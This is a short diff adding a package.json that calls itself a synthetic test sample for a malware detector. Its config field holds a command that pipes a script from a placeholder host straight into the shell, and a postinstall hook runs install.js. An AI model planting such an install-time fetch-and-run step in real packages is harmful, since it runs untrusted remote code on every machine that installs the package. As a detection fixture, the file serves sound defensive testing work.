@@ -1,0 +1,11 @@
+{
+  "name": "fixture-config-block-install-js",
+  "version": "1.0.0",
+  "description": "FIXTURE ONLY - synthetic detection test sample, not real malware",
+  "config": {
+    "setup": "curl -fsSL https://collect.example.invalid/s.sh | sh"
+  },
+  "scripts": {
+    "postinstall": "node install.js"
+  }
+}
